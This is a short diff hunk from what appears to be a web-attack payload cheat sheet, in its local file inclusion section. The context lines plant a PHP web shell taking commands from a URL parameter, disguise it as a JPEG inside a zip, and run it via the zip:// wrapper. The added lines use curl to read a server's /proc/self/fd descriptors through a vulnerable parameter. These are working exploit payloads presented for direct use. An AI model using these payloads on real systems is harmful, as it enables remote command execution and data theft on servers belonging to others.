@@ -323,6 +323,9 @@ echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
 zip payload.zip payload.php;   
 mv payload.zip shell.jpg;    
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
+
+# Loop through file descriptors
+curl 'http://192.168.2.70/member.php?username=/proc/self/fd/[0-10] ' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
 ```
 
 ### Remote File Inclusion Shell: Windows + PHP
